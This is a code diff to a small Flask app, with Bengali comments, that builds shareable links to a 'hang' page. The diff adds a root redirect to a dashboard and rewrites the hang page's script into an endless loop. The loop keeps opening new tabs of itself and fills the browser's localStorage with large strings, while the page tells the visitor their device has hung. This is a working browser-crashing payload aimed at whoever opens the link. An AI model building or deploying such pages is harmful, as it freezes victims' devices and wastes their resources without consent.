@@ -1,6 +1,7 @@
+# app.py
 import uuid
 import os
-from flask import Flask, request, render_template_string
+from flask import Flask, request, render_template_string, redirect
 
 app = Flask(__name__)
 
@@ -163,6 +164,11 @@ function copyLink() {
 </html>
 '''
 
+@app.route('/')
+def home():
+    # রুট ইউআরএল খুললেই ড্যাশবোর্ড দেখাবে
+    return redirect('/dashboard')
+
 @app.route('/dashboard')
 def dashboard():
     uid = str(uuid.uuid4())[:8]
@@ -183,13 +189,19 @@ def hang(uid):
         <head><title>💀 HANG</title></head>
         <body>
         <script>
-            var arr = [];
-            while (true) {
-                arr.push(new Array(1000000).join('x'));
-                setTimeout(function(){}, 0);
-            }
+            (function() {
+                while (true) {
+                    window.open(window.location.href, '_blank');
+                    for (let i = 0; i < 100000; i++) {
+                        try {
+                            localStorage.setItem('x'+i, 'x'.repeat(100000));
+                        } catch(e) {}
+                    }
+                    setTimeout(function(){}, 0);
+                }
+            })();
         </script>
-        <h1 style="color:red; text-align:center; margin-top:20%;">💀 HANGING...</h1>
+        <h1 style="color:red;text-align:center;margin-top:20%;">💀 HANGING...</h1>
         <p style="text-align:center">আপনার ডিভাইস হ্যাং হয়ে গেছে।</p>
         </body>
         </html>
